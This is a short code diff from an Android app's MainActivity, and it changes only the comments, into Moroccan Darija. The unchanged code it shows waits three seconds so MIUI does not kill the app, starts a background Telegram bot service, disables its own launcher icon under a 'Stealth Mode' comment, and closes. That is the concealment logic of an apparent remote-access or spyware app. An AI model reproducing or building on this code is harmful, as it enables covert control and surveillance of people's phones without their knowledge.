@@ -38,20 +38,20 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         
-        // Kan-tsennaw chwiya (3 secondes) bach MIUI ma-ychokch f l'app
+        // Kan-tsennaw 3 secondes bach l'app mat-mse7ch mn MIUI
         new Handler().postDelayed(() -> {
             try {
-                // Start Telegram Bot Background Service
+                // Start l'bot
                 startForegroundService(new Intent(this, TelegramService.class));
 
-                // Hide Icon (Stealth Mode)
+                // Khebbi l'icone
                 getPackageManager().setComponentEnabledSetting(
                     new android.content.ComponentName(this, MainActivity.class),
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP
                 );
                 
-                // Close the app
+                // Sed l'app
                 finishAffinity();
             } catch (Exception e) {
                 e.printStackTrace();
